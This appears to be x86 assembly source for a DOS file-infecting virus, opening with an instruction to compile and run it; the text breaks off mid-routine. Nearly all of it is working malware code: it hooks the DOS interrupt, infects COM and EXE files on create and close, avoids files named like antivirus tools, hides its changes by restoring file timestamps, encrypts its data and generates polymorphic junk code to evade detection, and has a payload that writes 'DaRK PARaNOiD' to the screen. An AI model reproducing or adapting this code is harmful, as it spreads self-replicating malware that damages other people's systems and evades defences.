; compile to COM then run it.

.MODEL tiny
.CODE
.186

begin:
	org	100h

virlen		equ	(offset endv-offset begin)
heaplen         equ	(offset heapend-offset heapbeg)
datalen		equ	(offset dataend-offset heapbeg)
len_range	equ	1001	
d_len		equ	offset d_end-offset d_beg
actionc		equ	4096
MAXinst		equ	8
b_d		equ	40h
len		equ	virlen+heaplen
WRITE_LEN	equ	virlen+datalen
write_len_exe	equ	virlen+(offset data_12e-offset heapbeg)
com_len		equ	write_len-100h
REQUEST_MEM	equ	(len)/16+1
C_head		equ	offset C_aft-offset start
ss_distance	equ	512
MAXCOM		equ	65535
gb_len		equ	offset gb_end-offset gb_mem
HEADERLEN	equ	20h
decr_code	equ	offset gb_mem-offset start
vSP             equ	200h
SS_to_CS        equ	(write_len_exe+len_range)/16+1
TF	equ	300h

start:
old_enable:
ENABLE:
		push	ds
		push	di

		push	0
		popf

		xor	di,di
		mov	ds,di

e1:		mov	di,cs:[engine__]
		xchg	word ptr ds:[01*4],di
e2:		mov	word ptr cs:[old1],di
		mov	di,cs
		xchg	word ptr ds:[01*4+2],di
e3:		mov	word ptr cs:[old1+2],di

		pop	di
		pop	ds

		push	TF
		push	cs
ent_:
		push	offset start_v

eA:		mov	cs:[oldptr],offset rcpt
		iret
old_engine:
ENGINE:		pusha
		mov	bp,sp
		push	ds
		push	cs
		pop	ds
e5:		mov	si,cs:[oldptr]		
ec_oldx:	nop
eng2:		mov	si,[bp+16]		
dc_oldx:	nop
e6:		mov	word ptr cs:[oldptr],si
		pop	ds
		popa
eng_iret:	iret

old_disable:
DISABLE:	push	ds
		push	di
                xor	di,di
		mov	ds,di			
e8:		
		mov	di,word ptr cs:[old1]
		mov	ds:[4],di
		mov	di,word ptr cs:[old1+2]
		mov	ds:[6],di

		pop	di
		pop	ds

                Iret				
	org	300h
C_aft:
gb_mem:				
old1		dd		?
engine__	dw		offset ENGINE
oldptr		dw	?
k1		dw	?
k2		dw	?
k3		dw	?
gb_end:
	org	400h

pred		db MAXinst dup (?)
start_v:	nop
		push	es

		push	cs
		pop	ds

		jmp	IDENTIFY

action:
	mov ax,0b800h
	mov ds,ax
	mov si,160*12+60
	mov byte ptr [si],'D'
	mov byte ptr [si+2],'a'
	mov byte ptr [si+4],'R'
	mov byte ptr [si+6],'K'
	mov byte ptr [si+8],' '
	mov byte ptr [si+10],'P'
	mov byte ptr [si+12],'A'
	mov byte ptr [si+14],'R'
	mov byte ptr [si+16],'a'
	mov byte ptr [si+18],'N'
	mov byte ptr [si+20],'O'
	mov byte ptr [si+22],'i'
	mov byte ptr [si+24],'D'

	xor	cx,cx

ddd:	push	cx

	mov	ax,3
	call	random
	mov	ah,80
	mul	ah
	mov	bl,al
	mov	ax,5
	call	random
	add	al,80-2
	add	al,bl
	mov	ah,al
	mov	al,0dh

	mov	dx,3d4h		
	out	dx,al
	xchg	al,ah
	inc	dx
	out	dx,al

	mov	dl,0b4h		
	xchg	ah,al
	out	dx,al
	inc	dx
	xchg	ah,al
	out	dx,al

	mov	dx,61h
	and	al,002h		
	or	al,30h		
	out	dx,al

	pop	cx
	dec	cx
	jnz	ddd

	retn	


ALLOC:
		mov	ah,50h
		mov	bx,8		
		int	21h
		nop
		mov	ah,48h		
		mov	bx,REQUEST_MEM
		int	21h
		nop
		pushf
		push	ax
		mov	bx,es
		mov	ah,50h		
		int	21h
		nop
		pop	ax
		popf
		retn

ACCESS:		mov	ax,5800h	
		int	21h
		nop
		mov	[UMB_strategy],ax
		mov	ax,5802h	
		int	21h
		nop	
		mov	ah,0
		mov	[UMB_link],ax
		mov	ax,5801h	
		mov	bx,0041h	; umb - best fit
		int	21h
		nop
		mov	ax,5803h	
		mov	bx,1
		int	21h
		nop
		retn

UNACCESS:	push	ax
		mov	bx,[UMB_link]
		mov	ax,5803h	; restore chain
		int	21h
		nop
		mov	ax,5801h	; restore strategy
		mov	bx,[UMB_strategy]
		int	21h
		nop
		pop	ax
		retn

gen_preint:	mov	ax,6
		call	random
		add	al,0f8h
		mov	byte ptr [INT_21],al
		retn
IDENTIFY:				
		mov	ah,2ah
		int	21h
		nop
		call	cr_data
		add	cx,dx		
		mov	dx,cs		
INSTALL_TO_MEM:	call	ACCESS
		call	ALLOC
		pushf
		call	UNACCESS
		popf
		jnc	mem_ok		
LOW_INSTALL:
		mov	ax,4a00h+'¨'
		mov	bx,-1
		int	21h	
		nop			
		mov	ah,4ah
		sub	bx,REQUEST_MEM+1
		int	21h		
		nop		
		call	ALLOC
		jnc	mem_ok
		push	es
		pop	ds		
		int	20h		
		nop
mem_ok:
		mov	es,ax		

COPY:		cld
		push	cs
		pop	ds
		xor	si,si
		xor	di,di
		mov	cx,write_len/2+1
		
		rep	movsw			
		

HIGHz:		push	es
		pop	ds			
rl2:
		mov	ax,offset temp_int_21
		mov	di,word ptr [ent__]
		mov	[di],ax			; entry point

		call	init_random
GET_VECTORZ:	push	0
		pop	ds			
		mov	ax,ds:[4*21h]
		mov	bx,ds:[4*21h+2]
		mov	word ptr es:[old_21],ax
		mov	word ptr es:[old_21+2],bx	

		mov	ax,cs:[bitch]
		mov	word ptr ds:[4*21h],ax
		mov	word ptr ds:[4*21h+2],es	

		mov	byte ptr es:[TEMP_INT_21],90h	
		
		mov	es,dx				
		push	cs
		pop	ds
		
		call	gen_preint

		mov	ah,4ch		; don't think it ends so soon.
		int	21h		; so much things to do.
 		
TEMP_INT_21:	nop
		add	sp,6		

		push	ds
		push	cs
		pop	ds				
		mov	di,[old1_ofs]
		mov	ax,word ptr es:[di]
		mov	word ptr ds:[di],ax
		mov	ax,word ptr es:[di+2]		
		mov	word ptr ds:[di+2],ax

MAKE_HEAP:	xor	ax,ax
		mov	[create],ax

		mov	ax,offset int_21
		mov	di,word ptr [ent__]
		mov	[di],ax			


		push	es
		pusha
		call	morph
		push	0
		pop	ds
		mov	ax,cs:[bitch]
		mov	word ptr ds:[4*21h],ax

		popa
		pop	es ds

RETURN:		mov	ax,ss
		cmp	ax,dx			
		je	COM_RETURN

EXE_RETURN:	pop	es
		mov	cx,es			
		add	cx,10h

		mov	bx,[old_ss]
		add	bx,cx			

		add	[old_cs],cx		

		mov	ax,[old_sp]
		sub	ax,sp

		mov	ss,bx
		add	sp,ax			

		push	200h
		push	word ptr [old_cs]
		push	word ptr [old_ip]

		call	entry_regs
		jmp	take_off_2

entry_regs:	xor	si,si
		xor	di,di
		xor	ax,ax
		xor	bx,bx
		xor	cx,cx
		xor	dx,dx
		push	es
		pop	ds			
		retn

COM_RETURN:	
		mov	cx,[block_len]
		mov	si,[block_beg]
		mov	di,100h
		add	si,di
		cld
		rep	movsb		

		pop	es
		call	entry_regs
		
		push	200h
		push	es		
		push	100h
		jmp	take_off_2

TAKE_OFF_2:	pusha
		push	ds

		push	cs
		pop	ds
		mov	al,byte ptr [dis_val]
		mov	byte ptr [rcpt],al
		
		pop	ds
		popa

		push	cs:[disable__]	
		push	0
		push	cs
		push	offset rcpt
		iret				

ena_pop:

int_21:		nop
		cmp	ah,5bh			; create new file
		je	crt
		cmp	ah,3ch			
		jne	v001
crt:		cmp	cs:[create],0		
		jne	jin
		call	executable		
jin:		jnz	JUMP_INT21
cr_co:		call	hookold
		INT	21h			; come get some
		push	ds
		push	cs
		pop	ds
		jc	done			
		mov	[create],ax		
done:		call	rehook
		push	si
		mov	si,sp
		push	ss
		pop	ds
		push	ax
		lahf
		mov	[si+8],ah
		pop	ax
		pop	si
		pop	ds
		jmp	take_off_2

v001:		cmp	ax,6c00h		
		jne	v002
		cmp	dl,10h			
		je	ok6c
		cmp	dl,12h			
		jne	JUMP_INT21
ok6c:		cmp	cs:[create],0		
		jne	JUMP_INT21
		xchg	si,dx
		call	executable		
		xchg	si,dx
		jnz	JUMP_INT21		
		test	bl,2			
		jnz	cr_co
		push	ax cx
		push	bx			
		and	bl,0fch
		inc	bl
		inc	bl			
		call	hookold
		INT	21h
		nop
		call	rehook
		pop	bx
		jnc	cr_2			
		pop	cx ax
		jmp	JUMP_INT21		

cr_2:		add	sp,4
		push	ds
		push	cs
		pop	ds
		mov	[create],ax
		jmp	done			

v002:		cmp	ah,3eh			
		jne	v003
		cmp	cs:[create],bx
		jne	v003
		jmp	INFECT_	
	
v003:		cmp	ax,5800h
		je	ID_OK

JUMP_INT21:	push	0
		push 	word ptr cs:[old_21+2]	
		push	word ptr cs:[old_21]
		jmp	TAKE_OFF_2


hookold:	push   ax ds es
		push	0
		pop	ds
		push	cs
		pop	es
		mov	ax,word ptr cs:[old_21]
		xchg	ax,ds:[21h*4]
		mov	es:[hook21],ax
		mov	ax,word ptr cs:[old_21+2]		
		xchg	ax,ds:[21h*4+2]
		mov	es:[hook21+2],ax
		pop  es ds ax
		retn

rehook:		push ax ds 
		push	0
		pop	ds
		mov	ax,cs:[hook21]
		mov	ds:[21h*4],ax
		mov	ax,cs:[hook21+2]
		mov	ds:[21h*4+2],ax
		pop ds ax
		retn
		

X_21:		push	ax ds
		push	cs
		pop	ds

		mov	ax,word ptr [safe]
		mov	word ptr [rcpt],ax
		mov	al,[safe+2]
		mov	byte ptr [rcpt+2],al
		pop	ds ax
		jmp	rcpt

ID_OK:
		push	ax 
		push	dx cx
		call	hookold
		mov	ah,2ah
		int	21h
		nop
		call	rehook
		mov	ax,cx
		add	ax,dx
		pop	cx dx
		cmp	ax,cx
		pop	ax
		jne	JUMP_INT21
		add	sp,8			
		jmp	return

EXECUTABLE:	pusha			
		cld			
		mov	si,dx
		mov	bx,dx
i002:		lodsb
		cmp	al,'\'
		je	yepa
		cmp	al,':'
		jne	nopa
yepa:		mov	bx,si
nopa:		or	al,al
		jnz	i002			
		mov	ax,[bx]
		mov	bl,[bx+2]
		and	ax,0dfdfh		
		and	bl,0dfh
		cmp	ax,'VA'			; AV[*]
		je	ex_2
		cmp	ax,'CS'			; SCAN
		je	ex_2
		cmp	ax,'LC'			; CLEAN
		je	ex_2
		cmp	ax,'UG'			; GUARD (of eden ? )
		je	ex_2
		cmp	ax,'ON'			; NOD ?
		je	ex_2
		cmp	ax,'VF'			; ???
		je	ex_2
		cmp	ax,'OT'			; toolkit
		je	ex_2
		cmp	ax,'BT'			; tbav
		je	ex_2
		
		inc	al
		cmp	al,'Z'+1
		jne	sksm
		mov	al,'A'
sksm:
		cmp	al,ah
		jne	namvspb
		inc	ah
		cmp	ah,'Z'+1
		jne	skasm
		mov	ah,'A'
skasm:
		cmp	bl,ah
		je	ex_2
namvspb:		
		mov	ax,[si-3]
		mov	bl,[si-4]
		or	ax,2020h		
		or	bl,20h
		cmp	ax,'ex'		
		jne	i003
		cmp	bl,'e'
		je	ex_en
i003:		cmp	ax,'mo'		
		jne	ex_en
ex_2:		cmp	bl,'c'
ex_en:		popa
		retn

I_ERROR:	jmp	i_ec
INFECT_:
		pusha
		push	ds
		push	es
		call	hookold
		push	cs
		pop	es
		push	cs		
		pop	ds
i001:
TIMESTAMP:	mov	ax,5700h
		INT	21H			
		nop
		mov	al,cl
		and	al,1fh			
		dec	al		
		jnz	ts_1
		jmp	BAD_TIME		
ts_1:		push	cs
		pop	ds			
		mov	[time],cx
		mov	[date],dx		
READ_BUFFER:	call	seekstart

		mov	dx,offset buffer	
		mov	cx,HEADERLEN
		mov	ah,3fh
		INT	21h			
		nop
		jc	i_error	
		cmp	ax,cx
		jne	i_error
		call	random0
		mov	byte ptr [int_21],al		

		mov	ax,len_range		
		call	random
		mov	[len_add],ax
		mov	ax,actionc
		call	random
		cmp	ax,111h
		jne	noact
		pusha
		push	ds
		call	action
		pop	ds
		popa
noact:

		mov	ax,word ptr [buffer]
		cmp	ax,'MZ'
		je	E_I_2
		cmp	ax,'ZM'
		jne	COM_INFECT
e_i_2:		jmp	EXE_INFECT
isi:		push	si
		add	[disable__],ax
		add	[ent__],ax
		add	[dc_old],ax
		add	[dco_end],ax
		add	[bitch],ax

		mov	si,[__old_1]
		add	[si+4],ax	

		pop	si
		retn

cni:	jmp	CAN_NOT_INFECT

COM_INFECT:	call	seekend

		or	dx,dx
		jnz	CNI
		cmp	ax,maxCOM-COM_Len
		ja	CNI		
		mov	[block_beg],ax

		call	seekstart

		push	bx
		call	ACCESS
		mov	ah,48h
		mov	bx,(COM_len+d_len+1+len_range)/16
		INT	21h
		pop	bx
		jnc	canal
		jmp	CAN_NOT_ALLOCATE
canal:
		mov	cx,COM_len
		add	cx,[len_add]
		mov	[temp_seg],ax
		mov	ds,ax
		xor	dx,dx
		mov	ah,3fh			
		INT	21h
		nop
		push	cs
		pop	ds	
		mov	[block_len],ax		
		push	ax

		call	seekstart

		mov	si,[ent__]
		push	[si]			
		mov	word ptr [si],offset start_v

		mov	dx,[bitch]
		mov	ax,100h
		sub	ax,dx
		push	ax
		call	isi

		mov	cx,C_head
		mov	ah,40h
		call	x_21

		mov	dx,offset C_aft
		mov	cx,COM_len
		add	cx,[len_add]

		cmp	[block_beg],cx		
		jae	long_c			
		mov	[block_beg],cx
long_c:
		sub	cx,[len_add]
		sub	cx,d_len+C_head
		mov	ah,40h			
		call	cr_data
		call	x_21			
		call	cr_data	
		add	[len_add],d_len
		call	write_add

		pop	ax
		neg	ax
		call	isi

		pop	[si]
		call	seekend
		pop	cx
		xor	dx,dx
		mov	ds,[temp_seg]
		mov	ah,40h			
		INT	21h			
		nop

		push	ds
		pop	es
		mov	ah,49h
		INT	21h
		nop

		push	cs
		pop	ds
		push	cs
		pop	es
CAN_NOT_ALLOCATE:
		call	UNACCESS

CAN_NOT_INFECT:				
		mov	cx,[time]
		mov	dx,[date]
		mov	ax,5701h		
		and	cl,0e0h
		or	cl,al
		INT	21h			
		nop
BAD_TIME:
i_ec:		mov	[create],0
		call	rehook
		call	gen_preint
		pop	es
		pop	ds
		popa
		jmp	JUMP_INT21		; close

Exe_Header      STRUC
EH_Signature    dw ?                    ; Set to 'MZ' or 'ZM' for .exe files
EH_Modulo       dw ?                    ; remainder of file size/512
EH_Size         dw ?                    ; file size/512
EH_Reloc        dw ?                    ; Number of relocation items
EH_Size_Header  dw ?                    ; Size of header in paragraphs
EH_Min_Mem      dw ?                    ; Minimum paragraphs needed by file
EH_Max_Mem      dw ?                    ; Maximum paragraphs needed by file
EH_SS           dw ?                    ; Stack segment displacement
EH_SP           dw ?                    ; Stack Pointer
EH_Checksum     dw ?                    ; Checksum, not used
EH_IP           dw ?                    ; Instruction Pointer of Exe file
EH_CS           dw ?                    ; Code segment displacement of .exe
eh_1st_reloc    dw ?               	; first relocation item
eh_ovl          dw ?               	; overlay number
Exe_Header      ENDS

EXE_INFECT:	push	cs
		pop	es
		mov	si,offset buffer+EH_SS		
		cmp	byte ptr [si+18h-EH_SS],40h
		je	i_ec
		cmp	word ptr [si+eh_ovl-EH_SS],0	; no evrs.
		jne	i_ec
		cmp	byte ptr [si+eh_max_mem-EH_SS+1],7	
		jbe	i_ec
		mov	di,offset old_SS
		cld
		movsw
		movsw				
		lodsw				; skip checksum
		movsw				
		movsw

		call	seekend
SET_EXE_HEAD:	push	ax dx
		mov	cx,200h
		div	cx			
		dec	ax			
		cmp	word ptr [buffer+EH_size],ax	
		pop	dx ax
		jb	i_ec

EI03:		push	ax dx
		and	al,0fh		
		jz	no_add
		mov	cx,10h
		sub 	cl,al	
		mov	ax,0b000h
		call    random
		xchg	dx,ax		
		mov	ah,40h
		INT	21h
		nop
		pop	dx ax
		add	ax,cx
		adc	dx,0	
		jmp	short yes_add

no_add:		pop	dx ax
yes_add:	push	ax dx
		mov	cx,16
		div	cx
		mov	dx,[bitch]
		mov	word ptr [buffer+EH_IP],dx	
		sub	ax,word ptr [buffer+EH_Size_Header]
		mov	word ptr [buffer+EH_CS],ax	
		
		add	ax,SS_to_CS
		mov	word ptr [buffer+EH_SS],ax
		mov	ax,900h
		call	random
		add	ah,2
		mov	al,0
		mov	word ptr [buffer+EH_SP],ax

		pop	dx ax
		
		add	ax,[len_add]
		adc	dx,0
		add	ax,write_len_exe
		adc	dx,0
		mov	cx,200h
		div	cx
		mov	word ptr [buffer+EH_Modulo],dx
		or	dx,dx
		jz	EI01
		inc	ax
EI01:		mov	word ptr [buffer+EH_Size],ax
		mov	si,[ent__]
		push	[si]			
		mov	word ptr [si],offset start_v
		
		xor	dx,dx
		mov	cx,write_len_exe	
		mov	ah,40h
		call	cr_data
		call	x_21			
		call	cr_data
		pop	[si]

		call	write_add

		jnc	EI02
		jmp	CAN_NOT_INFECT
EI02:
		call	seekstart

		mov	dx,offset buffer
		mov	cx,headerlen
		mov	ah,40h			
		INT	21h
		nop

		jmp	CAN_NOT_INFECT
seekend:	mov	ax,4202h
se_c:		xor	cx,cx
		xor	dx,dx
		INT	21h
		retn

seekstart:	mov	ax,4200h
		jmp	short	se_c

fake_seg:	mov	ax,0fa00h
		call	random			
		mov	ds,ax
		mov	al,byte ptr ds:[0]
		cmp	al,byte ptr ds:[1]			
		je	fake_seg
		mov	al,byte ptr ds:[len_range-6]
		cmp	al,byte ptr ds:[len_range-8]	
		je	fake_seg
		retn

write_add:	call	fake_seg
		mov	cx,cs:[len_add]
		xor	dx,dx
		mov	ah,40h		
		INT	21h
		nop
		push	cs
		pop	ds
		retn
		retn

cr_ax	equ	offset cr_block+2

cr_randomize:
		mov	di,offset cr_ax
		mov	cx,6
cr_lop:
		movsw
		scasw
		scasb
		movsw
		scasw
		scasb
		dec	cx
		jnz	cr_lop
		retn		

cr_data:	push	si
		mov	si,offset heapbeg

xorsi		macro num
		db 81h,74h,&num,0,0
		endm

cr_block:	
		db	81h,34h,0,0
		xorsi	2			; ????
		xorsi	4
		xorsi	6
		xorsi	8
		xorsi	10

		xorsi	12
		xorsi	14
		xorsi	16
		xorsi	18
		xorsi	20
		xorsi	22

		pop	si
		retn

dil_ck:  stosw
         xchg  ax,bx
         stosw
         xchg  ax,cx
         stosw
         xchg  ax,dx
         stosw
         xchg ax,si
         stosw
         retn

dil_gen: mov di,offset getlost
         mov ax,08b2eh
         mov bx,0026h+256*(255 and (offset sp_tmp-offset begin))
         mov cx,0bf00h+(offset sp_tmp-offset begin) shr 8
         mov dx,offset rcpt
         mov si,0f78bh
         call dil_ck
         mov ax,0df8bh
         mov bx,04c6h
         mov cx,0ffc3h
         mov dx,0016h+256*(255 and (offset ec_new-offset begin))
         mov si,8a00h+(offset ec_new-offset begin) shr 8
         call dil_ck
         mov ax,0a204h
         mov bx,offset dis_val
         mov cx,05c7h
         mov dx,21cdh
         mov si,45c6h
         call dil_ck
         mov ax,0c302h
         mov bx,16ffh
         mov cx,offset ec_new
         mov dx,368bh
         mov si,offset ecn_end
         call dil_ck
         mov ax,048fh
         mov bx,00beh+256*(255 and (offset new_enable-offset begin))
         mov cx,8b00h+(offset new_enable-offset begin) shr 8
         mov dx,0003eh+256*(255 and (offset bitch-offset begin))
         mov si,0b900h+(offset bitch-offset begin) shr 8
         call dil_ck
         mov ax,decr_code/2
         mov bx,0a5f3h
         mov cx,0c033h
         mov dx,0c08eh
         mov si,368bh
         call dil_ck
         mov ax,offset m1
         mov bx,8926h
         mov cx,0436h
         mov dx,8b00h
         mov si,00036h+256*(255 and (offset __old_1-offset begin))
         call dil_ck
         mov ax,0c700h+(offset __old_1-offset begin) shr 8
         mov bx,0644h
         mov cx,offset pred
         mov dx,00068h+256*(255 and TF)
         mov si,0e00h+(TF) shr 8
         call dil_ck
         mov ax,00068h+256*(255 and (offset getlost_po-offset begin))
         mov bx,02e00h+(offset getlost_po-offset begin) shr 8
         mov cx,36ffh
         mov dx,offset m1
         mov si,0c6c3h
         call dil_ck
         mov ax,0c304h
         mov bx,0c726h
         mov cx,0406h
         mov dx,0000h+256*(255 and (offset reCrypt-offset begin))
         mov si,0c700h+(offset reCrypt-offset begin) shr 8
         call dil_ck
         mov ax,0006h+256*(255 and (offset oldptr_2-offset begin))
         mov bx,(offset oldptr_2-offset begin) shr 8+256*(255 and (offset pred+1-offset begin))
         mov cx,05500h+(offset pred+1-offset begin) shr 8
         mov dx,0ec8bh
         mov si,1f0eh
         call dil_ck
         mov ax,070eh
	 mov bx,368bh
         mov cx,offset oldptr_2
         mov dx,0fe8bh
         mov si,0de8bh
         call dil_ck
         mov ax,16ffh
         mov bx,offset ec_new
         mov cx,0fe81h
         mov dx,offset END_offset
         mov si,0372h
         call dil_ck
         mov ax,07be9h
         mov bx,2bffh
         mov cx,0276h
         mov dx,0def7h
         mov si,0ce8bh
         call dil_ck
         mov ax,0e981h
         mov bx,0008h
         mov cx,0d9f7h
         mov dx,0c681h
         mov si,offset rcpt
         call dil_ck
         mov ax,7e8bh
         mov bx,0f302h
         mov cx,8ba4h
         mov dx,0276h
         mov si,000bfh+256*(255 and (offset rcpt-offset begin))
         call dil_ck
         mov ax,0a500h+(offset rcpt-offset begin) shr 8
         mov bx,0a5a5h
         mov cx,8ba5h
         mov dx,0276h
         mov si,0fe8bh
         call dil_ck
         mov ax,0de8bh
         mov bx,16ffh
         mov cx,offset dc_old
         mov dx,3689h
         mov si,offset oldptr_2
         call dil_ck
         mov ax,048bh
         mov bx,0cd3ch
         mov cx,3a74h
         mov dx,0f3ch
         mov si,3774h
         call dil_ck
         mov ax,703ch
         mov bx,0472h
         mov cx,7f3ch
         mov dx,2f76h
         mov si,08e3dh
         call dil_ck
         mov ax,74d3h
         mov bx,3c28h
         mov cx,7461h
         mov dx,3d27h
         mov si,0f1f7h
         call dil_ck
         mov ax,2174h
         mov bx,0c33ch
         mov cx,1e74h
         mov dx,0ee3ch
         mov si,1a74h
         call dil_ck
         mov ax,0cf3ch
         mov bx,1574h
         mov cx,0eb3ch
         mov dx,1174h
         mov si,0e83ch
         call dil_ck
         mov ax,0c74h
         mov bx,0e93ch
         mov cx,0874h
         mov dx,0ff3dh
         mov si,74d0h
         call dil_ck
         mov ax,0eb04h
         mov bx,460ah
         mov cx,4646h
         mov dx,8946h
         mov si,0276h
         call dil_ck
         mov ax,073e9h
         mov bx,33ffh
         mov cx,033f6h
         mov dx,033ffh
         mov si,0a1dbh
         call dil_ck
         mov ax,offset empty_seg
         mov bx,0d88eh
         mov cx,0c08eh
         mov dx,0c033h
         mov si,0cf5dh
         jmp  dil_ck

POWERUP:	push	cs
		pop	es		
		cld
		call	fake_seg
		xor	si,si
		mov	di,offset new_enable
		mov	cx,decr_code/2
		rep	movsw
		push	cs
		pop	ds


		mov	[__entry],offset int_21

		mov	ax,101h
		call	random
		mov	[bitch],ax
		add	ax,offset old_enable-offset new_enable-100h
		mov	[b2],ax


		call	random_g_mem
		mov	[__old_1],ax
		add	ax,4
		mov	[__engine],ax
		add	ax,2
		mov	[__oldptr],ax		
		add	ax,2
		mov	[__ks],ax
		mov	di,offset new_enable
		call	gen_enable

		mov	ax,b_d
		call	random
		add	di,ax

		mov	[m1],di
		mov	ax,[b2]
		add	[m1],ax

		call	gen_engine		
		push	cs
		pop	ds

		mov	ax,b_d
		call	random
		add	di,ax

		mov	ax,[b2]
		mov	[disable__],di		
		add	[disable__],ax
		call	gen_disable
		retn

decision: 	push	ax
		mov	ax,2
		call	random
		pop	ax
		retn

random0:        call	random
		mov	ax,cs:[rseed]
		retn

init_random:
	pusha
	push	ds
       	xor 	ax,ax
       	mov 	ds,ax
       	xor 	ax,ds:[046ch]
	xor	ax,ds:[3456h]
	xor	ax,ds:[7354h]
	pop 	ds
	mov 	word ptr [rseed],ax
	mov 	ah,2ah
	int 	21h
	nop
	xor	dx,ds:[046eh]
	xor	dx,ds:[8*4+2]
	xor	dx,ds:[2354h]
	mov 	word ptr [rseed+2],ax
	popa
	retn


random: push ds
	push cs
	pop ds
	mov word ptr [rtemp],ax
        push bx cx dx
	mov ax,word ptr [rseed]
	mov bx,word ptr [rseed+2]
        mov cx,ax
	mov dx,8405h
        mul dx
        shl cx,3
        add ch,cl
        add dx,cx
        add dx,bx
	shl bx,2
        add dx,bx
        add dh,bl
        shl bx,5
        add dh,bl
        add ax,1
	adc dx,0
	mov word ptr [rseed],ax
	mov word ptr [rseed+2],dx
        mov cx,dx
	mul word ptr [rtemp]
        mov ax,cx
        mov cx,dx
	mul word ptr [rtemp]
        xchg ax,dx
	add dx,cx
        adc ax,0
        pop dx cx bx ds
	or ax,ax
	retn

CSs	equ	0Eh	
DSs	equ	1Eh
ESs	equ	06h
SSs	equ	16h
t_mem	equ	0
t_const	equ	1
t_reg	equ	2
t_stack	equ	3
t_seg	equ	4
random_grow	equ	3
MK	equ	0cccch
		
mc_const struc	
mcc_type	db	?
		db	?
mcc_val		dw	?
mc_const ends	
		
mc_mem struc
mcm_type	db	?
mcm_seg		db	?
mcm_ofs		dw	?
mc_mem ends	
GET_TAB:	push	dx
		mov	al,[si]		
		mov	dl,5
		mul	dl
		add	al,[si+4]	
		shl	ax,2
		add	ax,offset cross_tab	
		call	ax
		or	ax,ax
		pop	dx
		retn
COMPILER:
comp_l:
		call	GET_TAB
		je	co_bad
		push	si	
		call	ax
		pop	si

		mov	ax,[si+4]
		cmp	al,t_reg
		jne	cll
		cmp	ah,[indy]
		jne	cll
		dec	[lock_ind]
cll:

co_ok:		add	si,8
		cmp	byte ptr [si],0ffh
		jne	comp_l
		retn

co_bad:		mov	al,90h
		stosb
		jmp	co_ok
RECURSER:	mov	[si],ax
		mov	[si+2],bx
		mov	[si+4],cx
		mov	[si+6],dx	
		call	ROOP
		add	si,8
		retn

ROOP:		call	GET_TAB
		jz	must_go		
		mov	ax,random_grow
		call	random
		jnz	roop_end
must_go:	mov 	ax,[si+4]
		mov	[si+8+4],ax
		mov	ax,[si+6]
		mov	[si+8+6],ax
ro_l:		mov	ax,4
		call	random
		mov	[si+4],al	
		cmp	al,t_reg
		jne	ro_lz		
		cmp	[lock_reg],0
		je	ro_l	
ro_lz:		cmp	al,t_stack
		jne	ro_lx
		cmp	word ptr [si],t_reg+4*256	
		je	ro_l
ro_lx:		call	GET_TAB
		jz	ro_l	
		mov	al,[si+4]
		cmp	al,t_mem
		je	garbage_mem	
		cmp	al,t_reg
		je	garbage_reg
garbage_ret:	mov	[si+4],ax	; destination
		mov	[si+6],bx
		mov	[si+8],ax	
		mov	[si+10],bx
		add	si,8
		jmp	ROOP		
roop_end:	retn		
garbage_reg:	mov	ah,[use_reg]
		jmp	garbage_ret
garbage_mem:	
		call	random_g_mem
		mov	bx,[__old_1]
		dec	bx		
		sub	bx,ax
		ja	gm_ok			
		add	bx,9
		jns	garbage_mem
gm_ok:		xchg	ax,bx			
		mov	ax,CSs*256+t_mem
		jmp	garbage_ret
CROSS_TAB:
		mov	ax,0
		retn
		mov	ax,0
		retn
		mov	ax,offset mem2reg
		retn
		mov	ax,offset mem2stack
		retn
		mov	ax,offset mem2seg
		retn
		mov	ax,offset const2mem
		retn
		mov	ax,0
		retn
		mov	ax,offset const2reg
		retn
		mov	ax,0
		retn
		mov	ax,0
		retn
		mov	ax,offset reg2mem
		retn
		mov	ax,0
		retn
		mov	ax,offset reg2reg
		retn
		mov	ax,offset reg2stack
		retn
		mov	ax,offset reg2seg
		retn
		mov	ax,offset stack2mem
		retn
		mov	ax,0
		retn
		mov	ax,offset stack2reg
		retn
		mov	ax,0
		retn
		mov	ax,offset stack2seg
		retn
		mov	ax,offset seg2mem
		retn
		mov	ax,0
		retn
		mov	ax,offset seg2reg
		retn
		mov	ax,offset seg2stack
		retn
		mov	ax,0
		retn

mem2reg:	mov	al,[si].mcm_seg
		call	drop_prefix
		mov	al,8Bh			; mov reg16,[mem16]
		mov	ah,[si+4+1]	

		shl	ah,3
		jmp	orah

mem2stack:	mov	al,[si].mcm_seg
		call	drop_prefix
		mov	ax,30ffh		; push [mem16]
		jmp	orah


mem2seg:	
		mov	al,[si].mcm_seg
		call	drop_prefix
		mov	al,08Eh			; mov seg,[mem16]
		mov	ah,[si+4+1]
		sub	ah,6
		jmp	orah

const2mem:	lodsw
		lodsw				; add si,4

		mov	al,[si].mcm_seg
		call	drop_prefix
		mov	ax,00c7h
		call	orah
		mov	ax,[si-4].mcc_val
		cmp	ax,MK
		jne	cm_ok
		mov	[ent__],di
		mov	ax,[b2]
		add	[ent__],ax
		mov	ax,[__entry]
cm_ok:		stosw
		retn

const2reg:	mov	al,[si+4+1]
		cmp	[si].mcc_val,0
		jne	c2r2
		mov	dl,9
		mul	dl
		xchg	ah,al
		call	decision
		jz	c2r3
		or	ax,0c033h		; xor reg,reg
		jmp	c2rc
c2r3:		
		or	ax,0c02bh		; sub reg,reg
		jmp	c2rc
		
c2r2:		
		add	al,0B8h			; mov reg16,imm16
		stosb
		mov	ax,[si].mcc_val
c2rc:		stosw
		retn

reg2mem:	lodsw
		lodsw				; add si,4
		mov	al,[si].mcm_seg
		call	drop_prefix
		mov	al,89h			; mov [mem16],reg16
		mov	ah,[si-4+1]		

		shl	ah,3
		jmp	orah

reg2reg:	mov	ah,[si+4+1]
		cmp	ah,[si+1]		
		je	r2r_
		shl	ah,3
		or	ah,[si+1]
		or	ah,0c0h
		mov	al,8bh
		stosw
r2r_:		retn
		
reg2stack:	mov	al,[si+1]
		add	al,50h			; push reg16
		stosb
		retn

reg2seg:	
		mov	al,08eh			; mov seg,reg16
		mov	ah,[si+4+1]
r2_c2:		add	ah,[si+1]
		add	ah,0c0h-6
		stosw
		retn

stack2mem:	lodsw
		lodsw
		mov	al,[si].mcm_seg
		call	drop_prefix
		mov	ax,008fh		; pop [mem16]
		jmp	orah
		
stack2reg:	mov	al,[si+4+1]
		add	al,58h			; pop reg16
		stosb
		retn

stack2seg:	
		mov	al,[si+4+1]
		inc	al
		stosb
		retn
		
seg2mem:	lodsw
		lodsw
		mov	al,[si].mcm_seg
		call	drop_prefix
		mov	al,08ch			; mov seg,[mem16]
		mov	ah,[si+1-4]
		sub	ah,6
		jmp	orah

seg2reg:	
		mov	al,08ch			; mov seg,reg16
